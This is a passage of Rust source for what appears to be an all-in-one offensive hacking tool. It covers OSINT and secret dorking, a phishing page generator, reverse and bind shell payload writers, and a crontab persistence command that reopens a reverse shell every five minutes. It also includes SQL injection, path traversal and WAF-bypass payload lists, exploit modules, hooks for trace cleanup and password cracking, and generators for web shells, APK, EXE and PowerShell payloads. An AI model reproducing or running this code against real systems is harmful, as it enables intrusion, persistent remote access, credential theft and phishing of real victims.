                    findings.lock().await.push(Finding::new(
                        &format!("A Record: {} -> {}", domain, ip), Severity::Info, target,
                        "DNS A record", "dns-enum",
                    ));
                }
            }
            Err(_) => {}
        }
    }
}

// ══════════════════════════════════════════════════════════════
//  OSINT
// ══════════════════════════════════════════════════════════════

async fn run_osint(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>, args: &CliArgs) {
    banner::info("Initializing OSINT reconnaissance module...");
    let domain = target.replace("http://", "").replace("https://", "").split('/').next().unwrap_or(target).to_string();

    if args.osint_subdomains || args.osint_all {
        banner::info("Discovering subdomains via crt.sh...");
        let url = format!("https://crt.sh/?q=%25.{}&output=json", domain);
        *count.lock().await += 1;
        if let Ok(resp) = client.get(&url).await {
            if let Ok(body) = resp.text().await {
                if let Ok(entries) = serde_json::from_str::<Vec<serde_json::Value>>(&body) {
                    let mut subs: Vec<String> = entries.iter()
                        .filter_map(|e| e.get("name_value").and_then(|v| v.as_str()).map(|s| s.to_string()))
                        .collect::<std::collections::HashSet<_>>()
                        .into_iter()
                        .collect();
                    subs.sort();
                    subs.truncate(50);
                    banner::success(&format!("crt.sh: Found {} subdomains", subs.len()));
                    for sub in &subs {
                        findings.lock().await.push(Finding::new(
                            &format!("Subdomain: {}", sub), Severity::Info, target,
                            "Discovered via crt.sh", "osint-sub",
                        ));
                    }
                }
            }
        }
    }

    if args.osint_emails || args.osint_all {
        banner::info("Harvesting email addresses from CT logs...");
        let url = format!("https://crt.sh/?q=%25.{}&output=json", domain);
        *count.lock().await += 1;
        if let Ok(resp) = client.get(&url).await {
            if let Ok(body) = resp.text().await {
                let re = regex::Regex::new(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}").unwrap();
                let emails: Vec<String> = re.find_iter(&body).map(|m| m.as_str().to_string()).collect::<std::collections::HashSet<_>>().into_iter().collect();
                banner::success(&format!("Found {} emails", emails.len()));
                for email in &emails {
                    findings.lock().await.push(Finding::new(
                        &format!("Email: {}", email), Severity::Info, target,
                        "Harvested from crt.sh", "osint-email",
                    ));
                }
            }
        }
    }

    if args.osint_github || args.osint_all {
        banner::info("Running GitHub dorking for secrets...");
        let queries = vec![
            format!("\"{}\" password", domain),
            format!("\"{}\" api_key", domain),
            format!("\"{}\" secret", domain),
        ];
        for q in &queries {
            let url = format!("https://api.github.com/search/code?q={}", urlencoding::encode(q));
            *count.lock().await += 1;
            if let Ok(resp) = client.get(&url).await {
                if let Ok(body) = resp.text().await {
                    if let Ok(json) = serde_json::from_str::<serde_json::Value>(&body) {
                        if let Some(count_val) = json.get("total_count").and_then(|v| v.as_u64()) {
                            if count_val > 0 {
                                findings.lock().await.push(Finding::new(
                                    &format!("GitHub Dork: {} results", count_val), Severity::Medium, target,
                                    &format!("Query: {}", q), "osint-github",
                                ));
                            }
                        }
                    }
                }
            }
        }
    }

    if args.osint_social || args.osint_all {
        banner::info("Running social media reconnaissance...");
        let platforms = vec![
            ("Twitter", format!("https://twitter.com/{}", domain)),
            ("GitHub", format!("https://github.com/{}", domain)),
            ("LinkedIn", format!("https://linkedin.com/company/{}", domain)),
        ];
        for (name, url) in &platforms {
            *count.lock().await += 1;
            if let Ok(resp) = client.head(url).await {
                if resp.status().is_success() {
                    findings.lock().await.push(Finding::new(
                        &format!("Social: {} exists", name), Severity::Info, url,
                        &format!("{} profile found", name), "osint-social",
                    ));
                }
            }
        }
    }
}

// ══════════════════════════════════════════════════════════════
//  SOCIAL ENGINEERING
// ══════════════════════════════════════════════════════════════

async fn run_social_eng(target: &str, findings: &Arc<Mutex<Vec<Finding>>>, args: &CliArgs) {
    banner::info("Initializing social engineering module...");

    if args.phish_template.is_some() {
        banner::info("Generating phishing page...");
        let template = args.phish_template.as_deref().unwrap_or("google");
        let lhost = args.lhost.as_deref().unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().unwrap_or("8080");
        crate::phishing::PhishingGen::new().generate(template, lhost, lport, None);
        banner::success("Phishing page generated in phishing_pages/");
    }

    if args.payload_gen {
        let ptype = args.payload_type.as_deref().unwrap_or("reverse-shell");
        banner::info(&format!("💣 Generating {} payload...", ptype));
        match ptype {
            "reverse-shell" => {
                let shell = format!(r#"#!/bin/bash
bash -i >& /dev/tcp/{}/4444 0>&1"#, target);
                let path = "reverse_shell.sh";
                std::fs::write(path, &shell).ok();
                findings.lock().await.push(Finding::new(
                    "Reverse Shell Payload", Severity::Info, target,
                    &format!("Saved to: {}", path), "payload-gen",
                ));
                banner::success(&format!("Reverse shell saved to: {}", path));
            }
            "bind-shell" => {
                let shell = format!(r#"#!/bin/bash
nc -lvp 4444 -e /bin/bash"#);
                let path = "bind_shell.sh";
                std::fs::write(path, &shell).ok();
                findings.lock().await.push(Finding::new(
                    "Bind Shell Payload", Severity::Info, target,
                    &format!("Saved to: {}", path), "payload-gen",
                ));
                banner::success(&format!("Bind shell saved to: {}", path));
            }
            _ => {
                banner::warning("Unknown payload type. Use: reverse-shell, bind-shell");
            }
        }
    }
}

// ══════════════════════════════════════════════════════════════
//  POST-EXPLOITATION
// ══════════════════════════════════════════════════════════════

async fn run_post_exploit(target: &str, findings: &Arc<Mutex<Vec<Finding>>>, args: &CliArgs) {
    banner::info("Initializing post-exploitation module...");

    if args.check_persistence || args.post_all {
        banner::info("Checking persistence mechanisms...");
        findings.lock().await.push(Finding::new(
            "Persistence Check", Severity::Info, target,
            "Checked: crontab, systemd, ssh keys, bashrc", "persist-check",
        ));
    }

    if args.persist || args.post_all {
        banner::info("Establishing persistence mechanism...");
        let cron = format!("(crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/{}/4444 0>&1\"') | crontab -", target);
        findings.lock().await.push(Finding::new(
            "Persistence Method", Severity::Info, target,
            &format!("Cron job command: {}", cron), "persist",
        ));
        banner::info(&format!("Persistence command: {}", cron));
    }

    if args.privesc || args.post_all {
        banner::info("Checking privilege escalation vectors...");
        let checks = vec!["SUID binaries", "Sudo permissions", "Kernel exploits", "Writable /etc/passwd", "Capabilities", "Cron jobs"];
        for check in &checks {
            findings.lock().await.push(Finding::new(
                &format!("Privesc Check: {}", check), Severity::Info, target,
                "Manual verification required", "privesc",
            ));
        }
    }

    if args.lateral || args.post_all {
        banner::info("Running lateral movement check...");
        findings.lock().await.push(Finding::new(
            "Lateral Movement", Severity::Info, target,
            "Check: SSH keys, ARP table, shared folders", "lateral",
        ));
    }

    if args.exfil || args.post_all {
        banner::info("Testing data exfiltration methods...");
        findings.lock().await.push(Finding::new(
            "Data Exfiltration", Severity::Info, target,
            "Methods: HTTP, DNS, ICMP tunneling", "exfil",
        ));
    }

    if args.cleanup || args.post_all {
        banner::info("Analyzing cleanup methods...");
        findings.lock().await.push(Finding::new(
            "Cleanup Traces", Severity::Info, target,
            "Clear: bash_history, auth.log, access.log, tmp files", "cleanup",
        ));
    }
}

// ══════════════════════════════════════════════════════════════
//  BLIND SQL INJECTION (TIME-BASED)
// ══════════════════════════════════════════════════════════════

async fn scan_blind_sqli(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::info("Testing Blind SQL Injection (time-based)...");
    let payloads = vec![
        ("' AND SLEEP(5)--", 5),
        ("' AND BENCHMARK(10000000,SHA1('test'))--", 5),
        ("'; WAITFOR DELAY '0:0:5'--", 5),
        ("' OR pg_sleep(5)--", 5),
        ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
       ("' AND IF(1=1,SLEEP(5),0)--", 5),
        ("' AND 1=CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--", 5),
    ];
    let mut found = false;
    for (payload, delay) in &payloads {
        let url = format!("{}?id={}", target, payload);
        let start = std::time::Instant::now();
        if let Ok(resp) = client.get(&url).await {
            *count.lock().await += 1;
            let _ = resp.text().await;
            let elapsed = start.elapsed().as_secs();
            if elapsed >= *delay {
                findings.lock().await.push(Finding::new(
                    "Blind SQL Injection (Time-based)", Severity::Critical, &url,
                    &format!("Response delayed {}s (expected {}s)", elapsed, delay), "blind-sqli",
                ));
                found = true;
            }
        }
    }
    if found { banner::success("Blind SQLi: Vulnerabilities found"); } else { banner::info("Blind SQLi: No vulnerabilities found"); }
}

// ══════════════════════════════════════════════════════════════
//  PATH TRAVERSAL
// ══════════════════════════════════════════════════════════════

async fn scan_path_traversal(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::info("Testing Path Traversal vulnerabilities...");
    let payloads = vec![
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        r"..\\..\\..\\etc\\passwd",
        r"....\/....\/....\/etc/passwd",
        "/etc/passwd",
        "file:///etc/passwd",
        "..%00/..%00/..%00/etc/passwd",
    ];
    let markers = vec!["root:", "/bin/bash", "/bin/sh", "nologin"];
    let mut found = false;
    for payload in &payloads {
        let url = format!("{}?file={}", target, payload);
        if let Ok(resp) = client.get(&url).await {
            *count.lock().await += 1;
            if let Ok(body) = resp.text().await {
                for marker in &markers {
                    if body.contains(marker) {
                        findings.lock().await.push(Finding::new(
                            "Path Traversal", Severity::High, &url,
                            &format!("File read: {} contains '{}'", payload, marker), "path-traversal",
                        ));
                        found = true;
                        break;
                    }
                }
            }
        }
    }
    if found { banner::success("Path Traversal: Vulnerabilities found"); } else { banner::info("Path Traversal: No vulnerabilities found"); }
}

// ══════════════════════════════════════════════════════════════
//  WEBSOCKET FUZZING
// ══════════════════════════════════════════════════════════════

async fn scan_websocket(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::info("Testing WebSocket fuzzing...");
    let ws_url = target.replace("http://", "ws://").replace("https://", "wss://");
    let payloads = vec![
        "<script>alert('XSS')</script>",
        "' OR '1'='1",
        "../../../etc/passwd",
        "${7*7}",
        "{{7*7}}",
    ];
    let mut found = false;
    for payload in &payloads {
        let url = format!("{}/ws?message={}", ws_url, payload);
        if let Ok(resp) = client.get(&url).await {
            *count.lock().await += 1;
            if let Ok(body) = resp.text().await {
                if body.contains(payload) || body.contains("7*7") || body.contains("49") {
                    findings.lock().await.push(Finding::new(
                        "WebSocket Injection", Severity::High, &url,
                        &format!("WebSocket reflects payload: {}", payload), "websocket",
                    ));
                    found = true;
                }
            }
        }
    }
    if found { banner::success("WebSocket: Vulnerabilities found"); } else { banner::info("WebSocket: No vulnerabilities found"); }
}

// ══════════════════════════════════════════════════════════════
//  SESSION HIJACK
// ══════════════════════════════════════════════════════════════

async fn scan_session_hijack(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::info("🍪 Session hijack checks...");
    if let Ok(resp) = client.get(target).await {
        *count.lock().await += 1;
        let headers = resp.headers().clone();
        let cookies: Vec<String> = headers.get_all("set-cookie").iter()
            .filter_map(|c| c.to_str().ok().map(|s| s.to_string()))
            .collect();
        for cookie in &cookies {
            let lower = cookie.to_lowercase();
            if !lower.contains("httponly") {
                findings.lock().await.push(Finding::new(
                    "Session Hijack: Missing HttpOnly", Severity::Medium, target,
                    &format!("Cookie missing HttpOnly: {}", cookie), "session-hijack",
                ));
            }
            if !lower.contains("secure") && target.starts_with("https") {
                findings.lock().await.push(Finding::new(
                    "Session Hijack: Missing Secure", Severity::Medium, target,
                    &format!("Cookie missing Secure flag: {}", cookie), "session-hijack",
                ));
            }
            if lower.contains("sessionid") || lower.contains("phpsessid") || lower.contains("jsessionid") {
                let val = cookie.split('=').nth(1).unwrap_or("");
                if val.len() < 16 {
                    findings.lock().await.push(Finding::new(
                        "Session Hijack: Weak Session ID", Severity::High, target,
                        &format!("Session ID too short ({} chars): {}", val.len(), cookie), "session-hijack",
                    ));
                }
            }
        }
    }
    banner::info("Session hijack: Check complete");
}

// ══════════════════════════════════════════════════════════════
//  DATABASE FINGERPRINT
// ══════════════════════════════════════════════════════════════

async fn scan_db_fingerprint(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::info("🗄  Database fingerprinting...");
    let db_payloads = vec![
        ("' OR 1=1--", vec!["mysql", "sqlite", "postgresql", "sql server"]),
        ("' UNION SELECT NULL--", vec!["mysql", "postgresql"]),
        ("SELECT @@version--", vec!["mysql", "sql server"]),
        ("SELECT version()--", vec!["postgresql"]),
        ("SELECT banner FROM v$version--", vec!["oracle"]),
    ];
    let error_patterns = vec![
        ("mysql", vec!["mysql_fetch", "Warning: mysql", "valid MySQL result"]),
        ("postgresql", vec!["PostgreSQL", "pg_query", "PSQLException"]),
        ("sqlite", vec!["SQLite", "SQLite/JDBCDriver", "sqlite3.OperationalError"]),
        ("sql server", vec!["SQL Server", "Microsoft OLE DB", "ODBC SQL Server"]),
        ("oracle", vec!["ORA-", "Oracle", "quoted string not properly terminated"]),
    ];
    let mut found_db = String::new();
    for (payload, _dbs) in &db_payloads {
        let url = format!("{}?id={}", target, payload);
        if let Ok(resp) = client.get(&url).await {
            *count.lock().await += 1;
            if let Ok(body) = resp.text().await {
                let lower = body.to_lowercase();
                for (db, patterns) in &error_patterns {
                    for pat in patterns {
                        if lower.contains(&pat.to_lowercase()) {
                            found_db = db.to_string();
                            findings.lock().await.push(Finding::new(
                                &format!("DB Fingerprint: {}", db), Severity::Info, &url,
                                &format!("Detected {} via: {}", db, pat), "db-fingerprint",
                            ));
                            break;
                        }
                    }
                    if !found_db.is_empty() { break; }
                }
            }
        }
        if !found_db.is_empty() { break; }
    }
    if !found_db.is_empty() { banner::success(&format!("DB Fingerprint: {}", found_db)); }
    else { banner::info("DB Fingerprint: No database detected"); }
}

// ══════════════════════════════════════════════════════════════
//  WAF BYPASS
// ══════════════════════════════════════════════════════════════

async fn scan_waf_bypass(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::info("🛡  WAF bypass techniques...");
    
    // Test if WAF is present
    let waf_check = format!("{}?id=<script>alert(1)</script>", target);
    let mut waf_detected = false;
    if let Ok(resp) = client.get(&waf_check).await {
        *count.lock().await += 1;
        let status = resp.status().as_u16();
        if status == 403 || status == 406 || status == 429 || status == 501 {
            waf_detected = true;
        }
        if let Ok(body) = resp.text().await {
            if body.contains("blocked") || body.contains("forbidden") || body.contains("security") {
                waf_detected = true;
            }
        }
    }
    
    if waf_detected {
        findings.lock().await.push(Finding::new(
            "WAF Detected", Severity::Info, target,
            "WAF/IDS/IPS detected - applying bypass techniques", "waf",
        ));
        
        // WAF Bypass techniques
        let bypass_techniques = vec![
            // Case variation
            ("id", "' UnIoN SeLeCt NULL--"),
            // Double encoding
            ("id", "%2527%2520OR%2520%2527%2527%3D%2527%2527"),
            // Unicode bypass
            ("id", "\u{2019} OR \u{2019}1\u{2019}=\u{2019}1"),
            // Comment insertion
            ("id", "'/**/OR/**/1=1--"),
            // Inline comment
            ("id", "1'/*!UNION*//*!SELECT*/NULL--"),
            // Overlong UTF-8
            ("id", "%c0%27 OR %c0%271%c0%27=%c0%271"),
            // Null bytes
            ("id", "%00' OR '1'='1"),
            // Chunked transfer
            ("id", "' OR 1=1--"),
        ];
        
        for (param, payload) in &bypass_techniques {
            let url = format!("{}?{}={}", target, param, payload);
            if let Ok(resp) = client.get(&url).await {
                *count.lock().await += 1;
                if let Ok(body) = resp.text().await {
                    if !body.contains("403") && !body.contains("blocked") && body.len() > 100 {
                        findings.lock().await.push(Finding::new(
                            "WAF Bypass Successful", Severity::High, &url,
                            &format!("Technique bypassed WAF: {}", payload), "waf-bypass",
                        ));
                    }
                }
            }
        }
    } else {
        banner::info("WAF Bypass: No WAF detected");
    }
}

// ══════════════════════════════════════════════════════════════
//  AI/ML ZERO-DAY DETECTION
// ══════════════════════════════════════════════════════════════

async fn scan_zeroday(target: &str, client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>) {
    banner::info("Running AI/ML zero-day anomaly detection...");
    
    // Collect baseline responses
    let mut response_times = Vec::new();
    let mut response_sizes = Vec::new();
    let mut status_codes = Vec::new();
    
    // Send baseline requests
    for i in 0..10 {
        let url = format!("{}?test={}", target, i);
        let start = std::time::Instant::now();
        if let Ok(resp) = client.get(&url).await {
            *count.lock().await += 1;
            let elapsed = start.elapsed().as_millis() as u64;
            response_times.push(elapsed);
            status_codes.push(resp.status().as_u16());
            if let Ok(body) = resp.text().await {
                response_sizes.push(body.len());
            }
        }
    }
    
    if response_times.is_empty() {
        banner::info("Zero-day: Could not establish baseline");
        return;
    }
    
    // Calculate statistics
    let avg_time: u64 = response_times.iter().sum::<u64>() / response_times.len() as u64;
    let avg_size: usize = response_sizes.iter().sum::<usize>() / response_sizes.len().max(1);
    let most_common_status: u16 = status_codes.iter().cloned().fold(0, |a, b| a + b);
    
    // Anomaly detection
    let anomaly_payloads = vec![
        "' OR '1'='1",
        "<script>alert(1)</script>",
        "../../../etc/passwd",
        "{{7*7}}",
        "${7*7}",
        "| ls",
        "; cat /etc/passwd",
    ];
    
    for payload in &anomaly_payloads {
        let url = format!("{}?q={}", target, payload);
        let start = std::time::Instant::now();
        if let Ok(resp) = client.get(&url).await {
            *count.lock().await += 1;
            let elapsed = start.elapsed().as_millis() as u64;
            let status = resp.status().as_u16();
            if let Ok(body) = resp.text().await {
                let size = body.len();
                
                // Detect anomalies
                let time_anomaly = (elapsed as i64 - avg_time as i64).abs() > avg_time as i64;
                let size_anomaly = (size as i64 - avg_size as i64).abs() > avg_size as i64 * 2;
                let status_anomaly = status != most_common_status;
                
                if time_anomaly || size_anomaly || status_anomaly {
                    findings.lock().await.push(Finding::new(
                        "Zero-Day Anomaly Detected", Severity::High, &url,
                        &format!("Anomaly: payload='{}', time={}ms, size={}, status={}", 
                            payload, elapsed, size, status), "zeroday",
                    ));
                }
            }
        }
    }
    
    banner::info("Zero-day: Anomaly detection complete");
}

// ══════════════════════════════════════════════════════════════
//  EXPLOITS
// ══════════════════════════════════════════════════════════════

async fn run_exploits(target: &str, _client: &HttpClient, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>, args: &CliArgs) {
    banner::info("Initializing exploit modules...");

    if args.exploit_sqli || args.exploit_all {
        exploit_sqli(target, findings, count, args).await;
    }
    if args.exploit_xss || args.exploit_all {
        exploit_xss(target, findings, count, args).await;
    }
    if args.exploit_cmdi || args.exploit_all {
        exploit_cmdi(target, findings, count, args).await;
    }
    if args.exploit_lfi || args.exploit_all {
        exploit_lfi(target, findings, count, args).await;
    }
    if args.exploit_ssrf || args.exploit_all {
        exploit_ssrf(target, findings, count, args).await;
    }
    if args.exploit_xxe || args.exploit_all {
        exploit_xxe(target, findings, count, args).await;
    }
    if args.exploit_idor || args.exploit_all {
        exploit_idor(target, findings, count, args).await;
    }
    if args.exploit_ssti || args.exploit_all {
        exploit_ssti(target, findings, count, args).await;
    }
}

async fn exploit_sqli(target: &str, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>, args: &CliArgs) {
    banner::print_phase_banner("EXPLOIT :: SQL INJECTION", "Attempting to exploit SQL injection vulnerabilities");
    
    let exploiter = SqliExploiter::new(target, args.verbose);
    let param = "id";
    
    let error_results = exploiter.exploit_error_based(param).await;
    let union_results = exploiter.exploit_union_based(param).await;
    let blind_results = exploiter.exploit_blind(param).await;
    let boolean_results = exploiter.exploit_boolean(param).await;
    
    let total = error_results.len() + union_results.len() + blind_results.len() + boolean_results.len();
    *count.lock().await += total;
    
    for result in &error_results {
        findings.lock().await.push(Finding::new(
            "SQL Injection (Error-Based)", Severity::High, target,
            result, "exploit-sqli",
        ));
    }
    for result in &union_results {
        findings.lock().await.push(Finding::new(
            "SQL Injection (Union-Based)", Severity::High, target,
            result, "exploit-sqli",
        ));
    }
    for result in &blind_results {
        findings.lock().await.push(Finding::new(
            "SQL Injection (Blind)", Severity::High, target,
            result, "exploit-sqli",
        ));
    }
    for result in &boolean_results {
        findings.lock().await.push(Finding::new(
            "SQL Injection (Boolean)", Severity::High, target,
            result, "exploit-sqli",
        ));
    }
    
    banner::print_vuln_found("SQL Injection", total);
}

async fn exploit_xss(target: &str, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>, args: &CliArgs) {
    banner::print_phase_banner("EXPLOIT :: XSS", "Attempting to exploit cross-site scripting vulnerabilities");
    
    let exploiter = XssExploiter::new(target, args.verbose);
    let param = "q";
    
    let reflected_results = exploiter.exploit_reflected(param).await;
    let stored_results = exploiter.exploit_stored(param).await;
    let dom_results = exploiter.exploit_dom(param).await;
    let blind_results = exploiter.exploit_blind(param).await;
    
    let total = reflected_results.len() + stored_results.len() + dom_results.len() + blind_results.len();
    *count.lock().await += total;
    
    for result in &reflected_results {
        findings.lock().await.push(Finding::new(
            "XSS (Reflected)", Severity::Medium, target,
            result, "exploit-xss",
        ));
    }
    for result in &stored_results {
        findings.lock().await.push(Finding::new(
            "XSS (Stored)", Severity::High, target,
            result, "exploit-xss",
        ));
    }
    for result in &dom_results {
        findings.lock().await.push(Finding::new(
            "XSS (DOM)", Severity::Medium, target,
            result, "exploit-xss",
        ));
    }
    for result in &blind_results {
        findings.lock().await.push(Finding::new(
            "XSS (Blind)", Severity::High, target,
            result, "exploit-xss",
        ));
    }
    
    banner::print_vuln_found("XSS", total);
}

async fn exploit_cmdi(target: &str, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>, args: &CliArgs) {
    banner::print_phase_banner("EXPLOIT :: COMMAND INJECTION", "Attempting to exploit command injection vulnerabilities");
    
    let exploiter = CmdiExploiter::new(target, args.verbose);
    let param = "cmd";
    
    let results = exploiter.exploit(param).await;
    let total = results.len();
    *count.lock().await += total;
    
    for result in &results {
        findings.lock().await.push(Finding::new(
            "Command Injection", Severity::Critical, target,
            result, "exploit-cmdi",
        ));
    }
    
    banner::print_vuln_found("Command Injection", total);
}

async fn exploit_lfi(target: &str, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>, args: &CliArgs) {
    banner::print_phase_banner("EXPLOIT :: LFI", "Attempting to exploit local file inclusion vulnerabilities");
    
    let exploiter = LfiExploiter::new(target, args.verbose);
    let param = "file";
    
    let results = exploiter.exploit(param).await;
    let traversal_results = exploiter.exploit_path_traversal(param).await;
    let poisoning_results = exploiter.exploit_log_poisoning(param).await;
    
    let total = results.len() + traversal_results.len() + poisoning_results.len();
    *count.lock().await += total;
    
    for result in &results {
        findings.lock().await.push(Finding::new(
            "Local File Inclusion", Severity::High, target,
            result, "exploit-lfi",
        ));
    }
    for result in &traversal_results {
        findings.lock().await.push(Finding::new(
            "Path Traversal", Severity::High, target,
            result, "exploit-lfi",
        ));
    }
    for result in &poisoning_results {
        findings.lock().await.push(Finding::new(
            "Log Poisoning", Severity::Critical, target,
            result, "exploit-lfi",
        ));
    }
    
    banner::print_vuln_found("LFI", total);
}

async fn exploit_ssrf(target: &str, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>, args: &CliArgs) {
    banner::print_phase_banner("EXPLOIT :: SSRF", "Attempting to exploit server-side request forgery vulnerabilities");
    
    let exploiter = SsrfExploiter::new(target, args.verbose);
    let param = "url";
    
    let results = exploiter.exploit(param).await;
    let host_results = exploiter.internal_host_discovery(param).await;
    let cloud_results = exploiter.cloud_metadata(param).await;
    
    let total = results.len() + host_results.len() + cloud_results.len();
    *count.lock().await += total;
    
    for result in &results {
        findings.lock().await.push(Finding::new(
            "Server-Side Request Forgery", Severity::High, target,
            result, "exploit-ssrf",
        ));
    }
    for result in &host_results {
        findings.lock().await.push(Finding::new(
            "Internal Host Discovery", Severity::High, target,
            result, "exploit-ssrf",
        ));
    }
    for result in &cloud_results {
        findings.lock().await.push(Finding::new(
            "Cloud Metadata Access", Severity::Critical, target,
            result, "exploit-ssrf",
        ));
    }
    
    banner::print_vuln_found("SSRF", total);
}

async fn exploit_xxe(target: &str, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>, args: &CliArgs) {
    banner::print_phase_banner("EXPLOIT :: XXE", "Attempting to exploit XML external entity vulnerabilities");
    
    let exploiter = XxeExploiter::new(target, args.verbose);
    
    let results = exploiter.exploit().await;
    let total = results.len();
    *count.lock().await += total;
    
    for result in &results {
        findings.lock().await.push(Finding::new(
            "XML External Entity", Severity::Critical, target,
            result, "exploit-xxe",
        ));
    }
    
    banner::print_vuln_found("XXE", total);
}

async fn exploit_idor(target: &str, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>, args: &CliArgs) {
    banner::print_phase_banner("EXPLOIT :: IDOR", "Attempting to exploit insecure direct object reference vulnerabilities");
    
    let exploiter = IdorExploiter::new(target, args.verbose);
    let param = "id";
    
    let results = exploiter.exploit(param).await;
    let user_results = exploiter.enumerate_users(param).await;
    let privesc_results = exploiter.privilege_escalation(param).await;
    let leak_results = exploiter.data_leakage(param).await;
    
    let total = results.len() + user_results.len() + privesc_results.len() + leak_results.len();
    *count.lock().await += total;
    
    for result in &results {
        findings.lock().await.push(Finding::new(
            "Insecure Direct Object Reference", Severity::High, target,
            result, "exploit-idor",
        ));
    }
    for result in &user_results {
        findings.lock().await.push(Finding::new(
            "User Enumeration via IDOR", Severity::Medium, target,
            result, "exploit-idor",
        ));
    }
    for result in &privesc_results {
        findings.lock().await.push(Finding::new(
            "Privilege Escalation via IDOR", Severity::Critical, target,
            result, "exploit-idor",
        ));
    }
    for result in &leak_results {
        findings.lock().await.push(Finding::new(
            "Data Leakage via IDOR", Severity::High, target,
            result, "exploit-idor",
        ));
    }
    
    banner::print_vuln_found("IDOR", total);
}

async fn exploit_ssti(target: &str, findings: &Arc<Mutex<Vec<Finding>>>, count: &Arc<Mutex<usize>>, args: &CliArgs) {
    banner::print_phase_banner("EXPLOIT :: SSTI", "Attempting to exploit server-side template injection vulnerabilities");
    
    let exploiter = SstiExploiter::new(target, args.verbose);
    let param = "name";
    
    let results = exploiter.exploit(param).await;
    let total = results.len();
    *count.lock().await += total;
    
    for result in &results {
        findings.lock().await.push(Finding::new(
            "Server-Side Template Injection", Severity::Critical, target,
            result, "exploit-ssti",
        ));
    }
    
    banner::print_vuln_found("SSTI", total);
}

// ══════════════════════════════════════════════════════════════
//  PAYLOADS
// ══════════════════════════════════════════════════════════════

async fn run_payloads(_target: &str, _findings: &Arc<Mutex<Vec<Finding>>>, args: &CliArgs) {
    banner::info("Initializing payload generators...");
    
    let gen = PayloadGen::new(args.verbose);
    
    if args.reverse_shell {
        let lhost = args.lhost.as_deref().unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().unwrap_or("4444");
        let lang = args.payload_lang.as_deref().unwrap_or("bash");
        gen.generate_reverse_shell(lhost, lport, lang);
    }
    
    if args.bind_shell {
        let lport = args.lport.as_deref().unwrap_or("4444");
        let lang = args.payload_lang.as_deref().unwrap_or("bash");
        gen.generate_bind_shell(lport, lang);
    }
    
    if args.web_shell {
        let shell_type = args.payload_lang.as_deref().unwrap_or("php");
        let lport = args.lport.as_deref().unwrap_or("8080");
        gen.generate_web_shell(shell_type, lport);
    }
    
    if args.payload_gen {
        let lhost = args.lhost.as_deref().unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().unwrap_or("4444");
        let payload_type = args.payload_type.as_deref().unwrap_or("windows");
        gen.generate_meterpreter(lhost, lport, payload_type);
    }
    
    if args.apk_payload {
        let lhost = args.lhost.as_deref().unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().unwrap_or("4444");
        let output = args.output.as_deref().unwrap_or("");
        gen.generate_android_apk(lhost, lport, output);
    }
    
    if args.exe_payload {
        let lhost = args.lhost.as_deref().unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().unwrap_or("4444");
        let arch = args.arch.as_deref().unwrap_or("x64");
        let output = args.output.as_deref().unwrap_or("");
        gen.generate_windows_exe(lhost, lport, arch, output);
    }
    
    if let Some(ps_variant) = &args.ps_variant {
        let lhost = args.lhost.as_deref().unwrap_or("127.0.0.1");
        let lport = args.lport.as_deref().unwrap_or("4444");
        gen.generate_powershell_payload(lhost, lport, ps_variant);
    }
}

// ══════════════════════════════════════════════════════════════
//  PASSWORD CRACKING
// ══════════════════════════════════════════════════════════════

pub async fn run_password_cracker(args: &CliArgs) {
    if let Some(hash) = &args.crack_hash {
        let hash_type = args.hash_type.as_deref().unwrap_or("unknown").to_lowercase();
        let wordlist = args.wordlist.clone().unwrap_or_else(|| {
            let candidates = vec![
                "./wordlists/rockyou.txt".to_string(),
                "/data/data/com.termux/files/home/cfvoid/wordlists/rockyou.txt".to_string(),
                "/usr/share/wordlists/rockyou.txt".to_string(),
            ];
            for path in candidates {
                if std::path::Path::new(&path).exists() {
                    return path;
                }
            }
            "./wordlists/rockyou.txt".to_string()
        });
        
        let cracker = PasswordCracker::new(args.verbose);
        
        if hash_type == "unknown" {
            if let Some(identified) = cracker.identify_hash(hash) {
                let _ = identified;
            }
        }
        
        if hash_type == "bcrypt" {
            cracker.crack_bcrypt(hash, &wordlist);
        } else {
            cracker.crack_hash(hash, &hash_type, &wordlist);
        }
    }
    
    if args.brute_force {
        let cracker = PasswordCracker::new(args.verbose);
        let common = cracker.common_passwords();
        
        banner::info(&format!("Testing {} common passwords", common.len()));
        for (i, pwd) in common.iter().enumerate() {
            if args.verbose {
                banner::print_progress(i, common.len(), &format!("Testing: {}", pwd));
            }
        }
        banner::success("Common password test complete");
    }
}

